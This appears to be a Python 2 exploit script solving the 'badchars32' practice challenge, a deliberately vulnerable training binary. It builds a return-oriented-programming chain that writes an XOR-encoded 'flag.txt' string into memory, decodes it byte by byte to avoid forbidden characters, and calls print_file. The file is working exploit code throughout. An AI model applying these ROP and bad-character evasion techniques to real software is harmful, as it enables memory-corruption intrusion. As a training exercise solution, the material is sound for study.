from binascii import hexlify
import struct

def p32(addr):
    return struct.pack("<I", addr)

def pack_string(string):
    return int("0x" + "".join(map(lambda p: "".join(p), zip(hexlify(string)[::-1][1::2], hexlify(string)[::-1][0::2]))), 16)

# for i in $(seq 30 50); do echo "Bytes: $i"; python -c "print \"A\"*$i" | ./badchars32 >/dev/null; done
offset = 44

# mov DWORD PTR [edi],esi; ret;
write_gadget = 0x0804854f

# xor BYTE PTR [ebp+0x0],bl; ret;
xor_gadget = 0x08048547

# > vmmap
write_loc = 0x0804a000 + 0x50

# pop esi; pop edi; pop ebp; ret;
write_pop_gadget = 0x080485b9

# pop ebx; ret; 
xor_offset_pop_gadget = 0x0804839d

# pop ebp; ret;
xor_ptr_pop_gadget = 0x080485bb

print_file = 0x80483d0

xor_flag = "dnce,vzv"
xor_offset = 0x2

payload = "\x90" * offset +\
    p32(xor_offset_pop_gadget) + p32(xor_offset) +\
    p32(write_pop_gadget) + p32(pack_string(xor_flag[:4])) + p32(write_loc) + p32(write_loc) + p32(write_gadget) +\
    p32(xor_gadget) +\
    p32(xor_ptr_pop_gadget) + p32(write_loc + 0x1) + p32(xor_gadget) +\
    p32(xor_ptr_pop_gadget) + p32(write_loc + 0x2) + p32(xor_gadget) +\
    p32(xor_ptr_pop_gadget) + p32(write_loc + 0x3) + p32(xor_gadget) +\
    p32(write_pop_gadget) + p32(pack_string(xor_flag[4:])) + p32(write_loc + 0x4) + p32(write_loc + 0x4) + p32(write_gadget) +\
    p32(xor_gadget) +\
    p32(xor_ptr_pop_gadget) + p32(write_loc + 0x5) + p32(xor_gadget) +\
    p32(xor_ptr_pop_gadget) + p32(write_loc + 0x6) + p32(xor_gadget) +\
    p32(xor_ptr_pop_gadget) + p32(write_loc + 0x7) + p32(xor_gadget) +\
    p32(print_file) + 'fuck' + p32(write_loc)

assert all(x not in payload for x in ['\x78', '\x67', '\x61', '\x2e'])
print payload
